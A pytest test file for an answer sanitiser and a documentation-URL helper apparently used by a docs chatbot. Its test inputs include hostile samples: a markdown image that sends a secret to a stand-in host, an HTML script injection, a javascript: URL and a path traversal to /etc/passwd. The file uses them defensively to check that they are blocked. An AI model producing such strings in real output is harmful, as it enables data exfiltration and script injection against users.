"""
Tests for output sanitising and docs links.

Run with:
    python -m pytest tests/test_security.py -v
"""

from doctrace.security import docs_url, sanitize_answer


def test_markdown_image_is_removed():
    out = sanitize_answer("Done. ![x](https://evil.example/?q=secret) Bye.")
    assert "evil.example" not in out and "![" not in out


def test_link_keeps_text_but_drops_target():
    out = sanitize_answer("See [the docs](https://evil.example/a) for more.")
    assert out == "See the docs for more."


def test_reference_style_definition_is_removed():
    out = sanitize_answer("Text [x][1]\n\n[1]: https://evil.example/track")
    assert "evil.example" not in out


def test_html_tags_are_removed():
    out = sanitize_answer('Hi <img src="https://evil.example/p.png"> <script>x()</script>')
    assert "<img" not in out and "<script" not in out


def test_code_fences_are_left_alone():
    text = "Use:\n```python\nx = a[0](1)  # <b>keep</b>\n```\n"
    assert sanitize_answer(text) == text


def test_docs_url_for_normal_page_and_index():
    assert docs_url("tutorial/first-steps.md") == "https://fastapi.tiangolo.com/tutorial/first-steps/"
    assert docs_url("tutorial/dependencies/index.md") == "https://fastapi.tiangolo.com/tutorial/dependencies/"


def test_docs_url_rejects_odd_paths():
    home = "https://fastapi.tiangolo.com/"
    assert docs_url("../../etc/passwd") == home
    assert docs_url('x"><script>.md') == home
    assert docs_url("javascript:alert(1)") == home
